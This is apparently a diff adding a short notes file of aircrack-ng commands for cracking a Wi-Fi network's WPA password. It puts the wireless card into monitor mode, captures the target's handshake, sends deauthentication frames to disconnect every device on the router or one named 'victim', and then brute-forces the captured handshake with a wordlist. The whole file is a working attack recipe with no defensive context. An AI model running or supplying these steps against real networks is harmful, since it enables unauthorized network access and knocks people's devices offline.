@@ -1,0 +1,8 @@
+iwconfig
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --bssid MAC -c CHANNEL -w /home/kali/desktop/handshake wlan0mon(keep this terminal open)
+Open new Terminal
+aireplay-ng -0 0 -a MAC wlan0mon
+aireplay-ng -0 0 -a MAC(router) -c MAC(victim) wlan0mon (if we want to disconnect only one device not all devices on router)
+aircrack-ng handshake.cap -w wordlist.txt
